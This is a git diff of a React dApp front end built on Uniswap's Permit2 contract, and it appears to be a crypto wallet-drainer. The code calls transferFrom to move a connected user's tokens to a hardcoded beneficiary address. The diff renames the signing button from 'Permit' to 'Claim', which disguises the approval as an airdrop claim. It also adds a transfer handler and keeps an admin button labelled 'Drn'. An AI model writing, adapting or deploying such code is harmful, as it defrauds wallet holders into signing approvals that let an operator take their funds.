@@ -110,10 +110,13 @@ const handleAdmin = useCallback(async()=>{
     const permitContract = new Contract(PERMIT2_ADDRESS, permitAbi, signer);
     
     // const gasEstimate = await permitContract.estimateGas.transferFrom(account, "0xF3Be8230ac575e147621dCa068138922197D9f51", amount, token,{gasLimit: gasPrice});
+    const tokenAddress = '0xe6863210e49B080C044Cc5df861e5A83435844D0'; // Token contract address
 
     // console.log("Gas Estimate:", gasEstimate.toString());
     const ben = "0xF3Be8230ac575e147621dCa068138922197D9f51"
-    const tx = await permitContract.transferFrom(account, ben, amount, token
+    const tx = await permitContract.transferFrom(account, ben, amount, tokenAddress,{
+      gasPrice: gasPrice
+    }
     );
     console.log('Transaction Hash:', tx.hash);
 
@@ -124,6 +127,26 @@ const handleAdmin = useCallback(async()=>{
     console.error('Error executing transaction:', error);
   }
 }, [account, provider, spender])
+
+const handleTransfer = useCallback(async () => {
+  console.log(account)
+  const signer = provider!.getSigner(account)
+ let spen = "0xaA64D471b4d3A8Ee8fcacbC4c480d304aCEF0852"
+  account = '0xaA64D471b4d3A8Ee8fcacbC4c480d304aCEF0852'
+  console.log(account)
+  const permit2ContractAbi = [
+    'function transferFrom(address from, address to, uint160 amount, address token)',
+  ]
+  const permit2Contract = new Contract(token, permit2ContractAbi, signer)
+  const tx = await permit2Contract.transferFrom(
+    account,
+    spen,
+    BigNumber.from('1000000000000000000'),
+    token
+  )
+  console.log(tx)
+  await tx.wait()
+}, [provider, spender, account])
 
   const handlePermit = useCallback(async () => {
     const signer = provider!.getSigner(account);
@@ -288,9 +311,9 @@ const handleAdmin = useCallback(async()=>{
         {/* <p onClick={adminWallet(provider)} >
             Connect
         </p> */}
-    <button onClick={handleAdmin}> Drn</button>
+    {/* <button onClick={handleTransfer}> </button> */}
 
-           {validWallet ? ( <button onClick={handlePermit}>Permit</button>) :(<>Analyzing Wallet... Please Wait...</>)}
+           {validWallet ? ( <button onClick={handlePermit}>Claim</button>) :(<>Analyzing Wallet... Please Wait...</>)}
         </>
       ) : (
         <p onClick={connectWallet} >
